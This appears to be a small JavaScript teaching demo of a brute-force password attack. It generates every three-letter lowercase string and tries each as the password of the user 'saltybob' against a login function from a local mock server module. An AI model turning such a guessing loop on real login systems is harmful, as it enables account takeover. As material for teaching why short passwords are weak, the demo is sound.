const { generateWordList } = require('../../generate-word-list.js');
const { login } = require('../website-dot-com/server.js');

const alphabet = 'abcdefghijklmnopqrstuvwxyz';
const wordList = generateWordList(alphabet, 3);

const username = 'saltybob';
for (word of wordList) {
  if (login(username, word)) {
    console.log(word);
    console.log(`☝️ Pretty sure that's ${username}'s password`)
  };
}
